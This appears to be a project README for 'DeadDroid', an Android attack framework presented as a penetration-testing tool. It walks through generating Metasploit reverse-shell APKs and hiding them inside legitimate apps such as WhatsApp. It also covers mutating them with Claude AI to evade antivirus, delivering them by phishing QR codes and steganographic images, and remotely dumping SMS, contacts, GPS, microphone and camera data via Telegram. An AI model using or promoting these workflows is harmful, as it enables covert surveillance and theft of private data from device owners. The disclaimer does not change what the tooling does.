<div align="center">

```
██████╗ ███████╗ █████╗ ██████╗ ██████╗ ██████╗  ██████╗ ██╗██████╗
██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗
██║  ██║█████╗  ███████║██║  ██║██║  ██║██████╔╝██║   ██║██║██║  ██║
██║  ██║██╔══╝  ██╔══██║██║  ██║██║  ██║██╔══██╗██║   ██║██║██║  ██║
██████╔╝███████╗██║  ██║██████╔╝██████╔╝██║  ██║╚██████╔╝██║██████╔╝
╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝
```

# DeadDroid v2.0 — *PhantomDroid*
### Android Penetration Testing Framework

[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=for-the-badge&logo=python)](https://python.org)
[![Platform](https://img.shields.io/badge/Platform-Linux-orange?style=for-the-badge&logo=linux)](https://kali.org)
[![Metasploit](https://img.shields.io/badge/Metasploit-Integrated-red?style=for-the-badge)](https://metasploit.com)
[![Claude AI](https://img.shields.io/badge/Claude%20AI-Powered-purple?style=for-the-badge)](https://anthropic.com)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
[![Author](https://img.shields.io/badge/Author-faizzyhon-cyan?style=for-the-badge)](https://github.com/faizzyhon)

> **The most advanced open-source Android penetration testing framework — built for professionals.**

---

**⚠️ LEGAL DISCLAIMER**
> DeadDroid is developed for **authorised penetration testing, security research, and educational purposes only**.
> Using this tool against systems without explicit written permission is **illegal** and may result in criminal prosecution.
> The author assumes **zero liability** for misuse. You are solely responsible for your actions.

---

</div>

## Table of Contents

- [Features](#-features)
- [Architecture](#-architecture)
- [Requirements](#-requirements)
- [Installation](#-installation)
- [Quick Start](#-quick-start)
- [Module Guide](#-module-guide)
  - [Payload Generator](#1-payload-generator)
  - [APK Binder](#2-apk-binder)
  - [Session Manager](#3-session-manager)
  - [ngrok Tunnel Manager](#4-ngrok-tunnel-manager)
  - [Network & Port Forwarding](#5-network--port-forwarding)
  - [Extra Features](#6-extra-features)
  - [Report Generator](#7-report-generator)
  - [AI Assistant](#8-ai-assistant--claude)
- [Configuration](#-configuration)
- [Usage Examples](#-usage-examples)
- [Troubleshooting](#-troubleshooting)
- [Developer](#-developer)
- [License](#-license)

---

## ★ What Makes DeadDroid Different

> Every other Android pentest tool gives you a payload generator and a session shell.
> DeadDroid gives you an **entire operations platform** — features that simply don't exist anywhere else.

| Feature | TheFatRat | AhMyth | Ghost | AndroRAT | **DeadDroid** |
|---------|:---------:|:------:|:-----:|:--------:|:-------------:|
| Payload generation | ✔ | ✔ | ✔ | ✔ | ✔ |
| APK binding | ✔ | ✔ | ✗ | ✗ | ✔ |
| Session management | ✗ | ✔ | ✔ | ✔ | ✔ |
| Live TUI dashboard | ✗ | ✗ | ✗ | ✗ | **✔** |
| Telegram remote control | ✗ | ✗ | ✗ | ✗ | **✔** |
| Campaign manager | ✗ | ✗ | ✗ | ✗ | **✔** |
| Payload DNA tracking | ✗ | ✗ | ✗ | ✗ | **✔** |
| AI mutation engine | ✗ | ✗ | ✗ | ✗ | **✔** |
| Steganography delivery | ✗ | ✗ | ✗ | ✗ | **✔** |
| Android CVE scanner | ✗ | ✗ | ✗ | ✗ | **✔** |
| Mass payload batch | ✗ | ✗ | ✗ | ✗ | **✔** |
| Claude AI advisor | ✗ | ✗ | ✗ | ✗ | **✔** |
| HTML report generator | ✗ | ✗ | ✗ | ✗ | **✔** |
| Auto session keepalive | ✗ | ✗ | ✗ | ✗ | **✔** |

---

## ✨ Features

### Core Modules

| Module | Description |
|--------|-------------|
| **Payload Generator** | Generate Android APK payloads using `msfvenom` — 5 payload types, multiple encoders, auto-obfuscation |
| **APK Binder** | Inject Metasploit payloads into legitimate APKs — decompile → inject → recompile → sign, fully automated |
| **Session Manager** | Full Metasploit RPC integration — list sessions, run commands, device info, file ops, GPS, mic, camera |
| **ngrok Manager** | TCP & HTTP tunnel management via ngrok API v3 — start, list, stop tunnels in-tool |
| **Port Forwarding** | socat, SSH -L/-R tunnels, iptables PREROUTING — multi-backend forwarding engine |
| **Report Generator** | Generate professional HTML pentest reports with severity-rated findings |
| **AI Assistant** | Claude-powered pentest advisor — real-time guidance, technique suggestions, report help |
| **Configuration** | Persistent settings — MSF RPC credentials, default LHOST/LPORT, keepalive intervals |

### Extra Features (not found in other tools)

| Feature | Description |
|---------|-------------|
| **Auto Session Fetch** | Polls Metasploit RPC for new sessions — automatically starts keepalive on each new connection |
| **Long Session Keepalive** | Background thread sends periodic `getuid` heartbeats to prevent session timeout |
| **QR Payload Delivery** | Generate QR codes pointing to payload download URLs for social-engineering simulations |
| **Auto Multi-Handler** | One-click Metasploit listener launch with auto-run post-exploitation scripts |
| **SSL Pinning Bypass** | Auto-generate Frida scripts to bypass certificate pinning in Android apps |
| **ADB Helpers** | List devices, open shells, install APKs — ADB wrapped in a clean TUI |
| **Network Scanner** | nmap-powered live host discovery and port scanning |
| **Listener Monitor** | Poll a port and alert when a session connects — no more watching the terminal |
| **Claude AI Chat** | Persistent conversation with prompt caching — ask anything about Android pentesting |

---

## 🏗 Architecture

```
DeadDriod/
├── main.py               ← Entry point — main menu, module loader
├── config.py             ← Persistent settings (JSON-backed)
├── requirements.txt      ← Python dependencies
├── setup.sh              ← One-shot installer (Kali/Debian/Ubuntu)
└── core/
    ├── banner.py         ← ASCII art, version, developer info
    ├── utils.py          ← Shared helpers — IPs, tool checks, workspace
    ├── payload_gen.py    ← msfvenom wrapper, payload menu, RC script gen
    ├── apk_binder.py     ← Full APK injection pipeline (apktool + smali)
    ├── session_mgr.py    ← Metasploit RPC client, keepalive, device ops
    ├── ngrok_handler.py  ← ngrok v3 API — TCP/HTTP tunnel management
    ├── network.py        ← socat, SSH tunnels, iptables forwarding
    ├── ai_assistant.py   ← Claude AI with prompt caching, sign-in/out
    ├── reporter.py       ← HTML report generator with severity badges
    ├── extras.py         ← QR, auto-handler, ADB, scanner, Frida bypass
    ├── dashboard.py      ← ★ Live TUI session dashboard
    ├── telegram_bot.py   ← ★ Telegram push alerts + remote control
    ├── campaign.py       ← ★ Campaign & target manager
    ├── payload_dna.py    ← ★ Per-payload DNA tracking system
    ├── ai_mutator.py     ← ★ AI-powered smali mutation engine
    ├── stego_delivery.py ← ★ LSB steganography payload delivery
    ├── cve_scanner.py    ← ★ Android CVE fingerprint + NVD lookup
    └── mass_payload.py   ← ★ Batch payload generator with DNA + ZIP
```

### Data stored in `~/.deaddroid/`

```
~/.deaddroid/
├── payloads/    ← Generated APKs, RC scripts, QR codes
├── sessions/    ← Session logs
├── reports/     ← HTML pentest reports
├── logs/        ← deaddroid.log
├── certs/       ← Debug keystore for APK signing
├── config.json  ← User settings
└── ai_config.json ← Claude API key (encrypted path)
```

---

## 📋 Requirements

### System (Linux — Kali recommended)

| Tool | Purpose | Install |
|------|---------|---------|
| `python3.10+` | Runtime | `apt install python3` |
| `msfvenom` / `msfconsole` | Payload gen & handlers | `apt install metasploit-framework` |
| `apktool` | APK decompile/recompile | `apt install apktool` |
| `keytool` / `jarsigner` | APK signing | `apt install default-jdk` |
| `adb` | ADB shell helpers | `apt install adb` |
| `socat` | Port forwarding | `apt install socat` |
| `nmap` | Network scanner | `apt install nmap` |
| `ngrok` | Tunnel management | See [ngrok.com/download](https://ngrok.com/download) |
| `frida` | SSL pinning bypass | `pip install frida-tools` |

### Python Packages

```
rich>=13.7.0          # Beautiful terminal UI
anthropic>=0.25.0     # Claude AI API
pymetasploit3>=1.0.3  # Metasploit RPC client
qrcode[pil]>=7.4.2    # QR code generation
Pillow>=10.0.0        # Image handling
requests>=2.31.0      # HTTP utilities
```

---

## 🚀 Installation

### Method 1 — Automated (Recommended for Kali/Debian)

```bash
# Clone the repository
git clone https://github.com/faizzyhon/DeadDroid.git
cd DeadDroid

# Run the installer as root
chmod +x setup.sh
sudo ./setup.sh

# Launch from anywhere
deaddroid
```

### Method 2 — Manual

```bash
# 1. Clone
git clone https://github.com/faizzyhon/DeadDroid.git
cd DeadDroid

# 2. Install system tools (Kali / Debian / Ubuntu)
sudo apt update
sudo apt install -y python3 python3-pip python3-venv \
    default-jdk apktool adb socat nmap \
    metasploit-framework curl git

# 3. Install ngrok
curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc \
  | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
echo "deb https://ngrok-agent.s3.amazonaws.com buster main" \
  | sudo tee /etc/apt/sources.list.d/ngrok.list
sudo apt update && sudo apt install ngrok

# 4. Create virtual environment
python3 -m venv venv
source venv/bin/activate

# 5. Install Python dependencies
pip install -r requirements.txt

# 6. Run
python3 main.py
```

### Method 3 — Kali One-Liner

```bash
git clone https://github.com/faizzyhon/DeadDroid.git && \
cd DeadDroid && sudo ./setup.sh
```

---

## ⚡ Quick Start

```bash
# 1. Start Metasploit RPC (needed for session management)
start-msfrpc msf123 55553

# 2. Add your ngrok authtoken (optional, for remote testing)
ngrok config add-authtoken YOUR_NGROK_TOKEN

# 3. Launch DeadDroid
deaddroid
```

You'll see the main menu:

```
╭─────────────────── Main Menu ───────────────────╮
│ [1]  ⚡ Payload Generator                        │
│ [2]  🔧 APK Binder                               │
│ [3]  📡 Session Manager                          │
│ [4]  🌐 ngrok Tunnel Manager                     │
│ [5]  🔀 Network & Port Forwarding                │
│ [6]  ✨ Extra Features                           │
│ [7]  📝 Report Generator                         │
│ [8]  🤖 AI Assistant (Claude)                    │
│ [9]  ⚙️  Configuration                           │
│ [0]  🚪 Exit                                     │
╰─────────────────────────────────────────────────╯
```

---

## 📖 Module Guide

### 1. Payload Generator

Generate Android APK payloads using `msfvenom`.

**Supported payloads:**

| # | Payload | Description |
|---|---------|-------------|
| 1 | `android/meterpreter/reverse_tcp` | Classic reverse TCP meterpreter |
| 2 | `android/meterpreter/reverse_https` | Encrypted HTTPS (evades basic IDS) |
| 3 | `android/shell/reverse_tcp` | Lightweight raw shell |
| 4 | `android/meterpreter/reverse_http` | HTTP meterpreter |
| 5 | `android/meterpreter/bind_tcp` | Bind TCP (device listens) |

**Features:**
- Encoder selection (shikata_ga_nai, custom iterations)
- ngrok integration — LHOST auto-set to tunnel address
- Auto-generates Metasploit RC handler script
- Payload saved to `~/.deaddroid/payloads/`

```bash
# Example flow
Select payload: 2  (reverse_https)
LHOST: 192.168.1.10
LPORT: 4444
Use ngrok? Yes
→ Payload: ~/.deaddroid/payloads/payload_abc123.apk
→ Handler: ~/.deaddroid/payloads/payload_abc123.rc
```

---

### 2. APK Binder

Inject a Metasploit payload into an existing APK for social-engineering assessment.

**Pipeline:**
1. Decompile host APK with `apktool`
2. Generate msfvenom payload APK
3. Decompile payload APK
4. Copy payload smali classes into host
5. Merge required Android permissions
6. Hook launcher Activity's `onCreate`
7. Recompile with `apktool`
8. Sign with debug keystore (`jarsigner`)

```bash
# Example
Path to target APK: /home/user/whatsapp.apk
LHOST: 192.168.1.10
LPORT: 5555
→ Output: ~/.deaddroid/payloads/bound_whatsapp_ab12.apk
→ SHA-256: d4e5f6...
```

> **Note:** Only use on APKs you own or have written authorisation to test.

---

### 3. Session Manager

Full Metasploit RPC integration via `pymetasploit3`.

**Capabilities:**

| Command | Description |
|---------|-------------|
| List sessions | View all active Meterpreter sessions |
| Run command | Execute any Meterpreter command |
| Device info | `getuid` + `sysinfo` + `ifconfig` + `ps` |
| Screenshot | Capture device screen |
| Dump SMS | Extract SMS messages |
| Dump contacts | Extract contact list |
| GPS location | `geolocate` |
| Record mic | Record microphone audio |
| Webcam snap | Capture front/rear camera photo |
| Download/Upload | File transfer |
| **Keepalive** | Background thread prevents session timeout |
| **Auto-fetch** | Poll for new sessions, auto-start keepalive |

**Auto Session Fetch:**
```bash
Poll interval (s): 5
Watch duration (s): 600
→ Polls every 5s, automatically starts keepalive on every new session
```

---

### 4. ngrok Tunnel Manager

Manage ngrok tunnels via the ngrok v3 API (no authtoken required in tool — configure via `ngrok config add-authtoken`).

```bash
[1] Start TCP tunnel    → Get public_host:port for LHOST
[2] Start HTTP tunnel   → Get HTTPS URL for web delivery
[3] List active tunnels
[4] Stop all tunnels
```

---

### 5. Network & Port Forwarding

Multiple forwarding backends:

| Method | Use Case |
|--------|----------|
| socat forward | Redirect local port to remote host |
| socat reverse | Open reverse relay listener |
| SSH -L | Tunnel through SSH server (local forward) |
| SSH -R | Expose local port on remote SSH server |
| iptables PREROUTING | Kernel-level port redirect (root required) |

---

### 6. Extra Features

#### QR Payload Delivery
Generate a QR code PNG pointing to a payload URL — print it, embed it in a phishing email, or display on screen for social-engineering simulation.

#### Auto Multi-Handler
One-click Metasploit listener with auto-run post-exploitation. Writes `.rc` file and launches `msfconsole` automatically.

#### ADB Helpers
- List connected devices
- Open interactive ADB shell
- Install APKs directly to device

#### Network Scanner
nmap-powered: scan a subnet, discover live hosts, enumerate top 100 ports.

#### SSL Pinning Bypass (Frida)
Auto-generates a Frida script targeting `TrustManagerImpl` and `SSLContext` to bypass certificate pinning. Deploy with:
```bash
frida -U -l ssl_bypass.js -f com.target.app
```

#### Listener Health Monitor
Polls a port every N seconds and alerts when a connection arrives — great for knowing the moment a payload fires on a remote assessment.

---

### 7. Report Generator

Generate professional HTML pentest reports with:
- Executive summary
- Scope & methodology table
- Findings with severity badges (Critical / High / Medium / Low / Info)
- Evidence blocks with syntax highlighting
- Payload summary table
- Recommendations
- Professional dark-theme design

```bash
Report title: Android Security Assessment Q2 2025
Tester: Security Team
Target: com.example.banking
→ Opens in browser: file:///~/.deaddroid/reports/report_Android_Security...html
```

---

### 8. AI Assistant — Claude

Connect your Anthropic API key for real-time pentest guidance powered by **Claude Sonnet**.

**Sign In:**
```bash
[8] AI Assistant → Sign In
Enter Anthropic API key: sk-ant-...
✔ Claude AI connected successfully!
```

**What you can ask:**
- *"What post-exploitation modules work best on Android 13?"*
- *"Write a msfvenom one-liner for reverse_https with shikata encoding"*
- *"How do I pivot from a Meterpreter session to the internal network?"*
- *"Review my findings and suggest a CVSS score"*
- *"Generate an executive summary for my report"*

**Features:**
- Persistent conversation history (last 20 turns)
- Prompt caching for efficiency (lower API costs)
- `/clear` — reset conversation
- `/exit` — return to main menu
- Offline-safe: works without AI key, just shows sign-in prompt

---

## ⚙️ Configuration

Settings are stored at `~/.deaddroid/config.json`.

| Key | Default | Description |
|-----|---------|-------------|
| `msf_rpc_host` | `127.0.0.1` | Metasploit RPC server address |
| `msf_rpc_port` | `55553` | Metasploit RPC port |
| `msf_rpc_password` | `msf123` | Metasploit RPC password |
| `default_lhost` | auto | Default listener IP |
| `default_lport` | `4444` | Default listener port |
| `keepalive_interval` | `60` | Session keepalive interval (seconds) |
| `auto_sign_apk` | `true` | Auto-sign generated APKs |
| `ngrok_authtoken` | — | ngrok authentication token |

---

## 💡 Usage Examples

### Full Assessment Workflow

```bash
# Step 1: Start Metasploit RPC
start-msfrpc msf123 55553

# Step 2: Launch DeadDroid
deaddroid

# Step 3: Generate payload with ngrok tunnel
→ [1] Payload Generator
→ Select: android/meterpreter/reverse_https
→ Use ngrok? Yes
→ Output: payload_abc123.apk + payload_abc123.rc

# Step 4: Start listener
msfconsole -r ~/.deaddroid/payloads/payload_abc123.rc

# Step 5: Deliver payload (ADB for lab, or QR for simulation)
→ [6] Extra Features → ADB Helpers → Install APK

# Step 6: Auto-fetch & keepalive
→ [3] Session Manager → Auto session fetch

# Step 7: Post-exploitation
→ Session Manager → Device info / Screenshot / Dump SMS

# Step 8: Report
→ [7] Report Generator
```

### Remote Testing via SSH Reverse Tunnel

```bash
# On your VPS: allow remote port forwarding
# In DeadDroid:
→ [5] Network & Port Forwarding → SSH reverse forward (-R)
→ Remote port: 4444
→ Local port: 4444
→ SSH server: your-vps.com
→ SSH user: root

# Then generate payload with LHOST=your-vps.com LPORT=4444
```

---

---

## ★ Exclusive Features — Deep Dive

### 9. Live Dashboard

A **real-time Rich TUI** that auto-refreshes every 2 seconds showing all Meterpreter sessions, uptime timers, keepalive status, GPS location and device info — all in one screen. Automatically starts keepalive and fires Telegram notifications on every new session.

```bash
→ [9] Live Dashboard
→ Auto-start keepalive on new sessions? Yes
# Full-screen live view updates continuously — Ctrl+C to exit
```

No other Android pentest tool has a live session dashboard.

---

### 10. Telegram Remote Control

Configure a Telegram bot once — then **control every session from your phone**, no terminal needed.

**Setup:**
```bash
→ [10] Telegram Remote Control → Setup
# Paste bot token + chat ID
# Bot sends ✅ confirmation to your Telegram
```

**Bot commands (from Telegram):**
```
/sessions         — List all active sessions
/use 3            — Select session 3
/info             — sysinfo + uid
/ss               — Take screenshot
/sms              — Dump all SMS messages
/contacts         — Dump contacts
/loc              — Get GPS coordinates
/mic 15           — Record 15 seconds of audio
/cam              — Webcam photo
/shell getuid     — Run any Meterpreter command
/keepalive        — Start keepalive on selected session
```

When a new session opens, you get an **instant push notification** with full device info.

---

### 11. Campaign Manager

Track a complete penetration test engagement — targets, payloads, sessions, notes, and timeline — all in one persistent campaign file.

```bash
→ [11] Campaign Manager → New Campaign
Campaign name: "Client ABC Android Assessment Q2"
→ Add targets → Link payloads → Track sessions
→ View timeline → Export to HTML report
```

**Campaigns are stored at** `~/.deaddroid/campaigns/<id>.json` — survive reboots, shareable with teammates.

---

### 12. Payload DNA Tracker

Every payload gets a **unique 16-char hex DNA tag** embedded in the APK smali. When a session opens, DeadDroid reads the DNA to instantly answer:

- *Which payload file generated this session?*
- *Which target was it deployed against?*
- *Which campaign does it belong to?*

```bash
→ [12] Payload DNA Tracker → Show DNA Registry

DNA ID           | Payload                    | Target   | Session
A3F812C09D7E1B4A | payload_abc123.apk         | Target 1 | 3
```

---

### 13. AI Mutation Engine

Point the engine at any generated APK — it:
1. **Decompiles** the smali and scans for ~8 known AV signature patterns
2. **Applies string mutations** — renames Metasploit class paths to look like Android system classes
3. **Sends findings to Claude AI** for additional evasion suggestions
4. **Recompiles and signs** the mutated APK

```bash
→ [13] AI Mutation Engine
Path to APK: /root/.deaddroid/payloads/payload.apk
Use Claude AI analysis? Yes
→ Signatures found: 6
→ Mutations applied: 14
→ Claude: "Consider also renaming the Application class entry..."
→ Output: payload_mutated.apk
```

---

### 14. Steganography Delivery

**Hide a payload download URL inside a normal JPEG/PNG** using LSB steganography. The output image is visually identical — pixels differ only in their least-significant bit.

```bash
→ [14] Steganography Delivery → Hide URL in image
Cover image: /home/user/profile.jpg
URL to hide: http://192.168.1.10:8080/payload.apk
→ Output: stego_profile.png   (looks identical to original)
```

Share the image in a social-engineering simulation. The receiver runs the decoder to extract the URL.

```bash
python stego_decoder.py stego_profile.png
Hidden message: http://192.168.1.10:8080/payload.apk
```

---

### 15. Android CVE Scanner

Connect a device via ADB (or enter version manually) — DeadDroid **fingerprints the OS build and security patch level**, then cross-references against a curated database of 12+ high-impact CVEs (Stagefright, Janus, Binder OOB, ZygoteProcess injection, etc.) plus optionally queries the **NVD API** for recent CVEs.

```bash
→ [15] Android CVE Scanner → Scan connected device (ADB)
→ Device: Samsung Galaxy A53  Android 12  Patch: 2022-08-01

CVE ID          | Severity | CVSS | Description
CVE-2022-20465  | Critical | 9.1  | Lockscreen bypass
CVE-2022-20452  | High     | 8.4  | NotificationManager privilege escalation
CVE-2021-39793  | Critical | 8.8  | GPU driver heap OOB write
```

---

### 16. Mass Payload Generator

Generate a **configurable batch of unique payloads** in one command — each with a different port, encoder type and iteration count. Every payload gets:
- A DNA tracking tag
- An individual Metasploit RC handler script
- A **master RC script** that loads all handlers at once

```bash
→ [16] Mass Payload Generator
LHOST: 192.168.1.10
Starting port: 4444
Number of payloads: 20
Add DNA tags? Yes
ZIP outputs? Yes
→ Generated 20 payloads in ~/.deaddroid/payloads/batch_a1b2c3/
→ Master handler: batch_a1b2c3/master_handler.rc
→ batch_a1b2c3.zip
```

---

## 🔧 Troubleshooting

### msfvenom not found
```bash
sudo apt install metasploit-framework
# Or on non-Kali:
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | sudo ruby
```

### apktool fails on newer APKs
```bash
sudo apt remove apktool
wget https://github.com/iBotPeaches/Apktool/releases/latest/download/apktool_*.jar
sudo mv apktool_*.jar /usr/local/bin/apktool.jar
# Wrapper: https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
```

### pymetasploit3 connection refused
```bash
# Start RPC daemon first:
start-msfrpc msf123 55553
# Wait ~10 seconds for msfrpcd to initialise
```

### ngrok tunnel fails
```bash
# Add your authtoken:
ngrok config add-authtoken YOUR_TOKEN_FROM_dashboard.ngrok.com
```

### Claude AI — invalid key
- Get a free key at [console.anthropic.com](https://console.anthropic.com)
- Keys start with `sk-ant-`

### Enable debug mode
```bash
DEADDROID_DEBUG=1 deaddroid
```

---

## 👨‍💻 Developer

<div align="center">

### faizzyhon

**Android Security Researcher | Penetration Tester | Tool Developer**

[![GitHub](https://img.shields.io/badge/GitHub-faizzyhon-181717?style=for-the-badge&logo=github)](https://github.com/faizzyhon)
[![Telegram](https://img.shields.io/badge/Telegram-faizzyhon-2CA5E0?style=for-the-badge&logo=telegram)](https://t.me/faizzyhon)
[![Website](https://img.shields.io/badge/Website-faizzyhon.dev-FF4444?style=for-the-badge&logo=firefox)](https://faizzyhon.dev)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-faizzyhon-0A66C2?style=for-the-badge&logo=linkedin)](https://linkedin.com/in/faizzyhon)
[![Email](https://img.shields.io/badge/Email-faizzyhon@gmail.com-D14836?style=for-the-badge&logo=gmail)](mailto:faizzyhon@gmail.com)

*"Security through knowledge, not obscurity."*

</div>

---

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/new-module`
3. Commit changes: `git commit -m "Add: new-module description"`
4. Push: `git push origin feature/new-module`
5. Open a Pull Request

---

## 📜 License

```
MIT License

Copyright (c) 2025 faizzyhon

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND. THE AUTHOR
IS NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS SOFTWARE.
```

---

<div align="center">

**⭐ Star this repo if you find it useful**

Made with ❤️ by [faizzyhon](https://github.com/faizzyhon) | Powered by [Claude AI](https://anthropic.com)

*DeadDroid — For authorised testing only. Use responsibly.*

</div>
